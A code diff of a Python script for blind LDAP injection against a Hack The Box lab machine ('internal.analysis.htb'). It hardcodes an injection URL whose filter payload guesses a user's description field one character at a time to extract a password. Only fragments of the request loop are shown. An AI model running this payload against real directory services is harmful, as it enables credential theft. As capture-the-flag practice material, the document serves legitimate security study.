@@ -2,8 +2,9 @@ import argparse
 import requests
 import urllib.parse
 
+BASE_URL = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
 
-def main(charset_path, base_url):
+def main(charset_path):
     found_chars = ""
     skip_count = 6
     add_star = True
@@ -33,7 +34,7 @@ def main(charset_path, base_url):
                     add_star = False
                     continue
 
-                modified_url = base_url.replace("{FUZZ}", char_encoded).replace(
+                modified_url = BASE_URL.replace("{FUZZ}", char_encoded).replace(
                     "{found_char}", found_chars
                 )
 
@@ -58,11 +59,8 @@ def main(charset_path, base_url):
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="ldap injection fuzzer script for password extract for HTB Analysis box")
-    parser.add_argument(
-        "-c", "--charset", required=True, help="Path to the charset file"
-    )
-    parser.add_argument("-u", "--url", required=True, help="Base URL for fuzzing")
+    parser = argparse.ArgumentParser(description="LDAP injection fuzzer script for password extraction")
+    parser.add_argument("-c", "--charset", required=True, help="Path to the charset file")
     args = parser.parse_args()
 
-    main(args.charset, args.url)
+    main(args.charset)
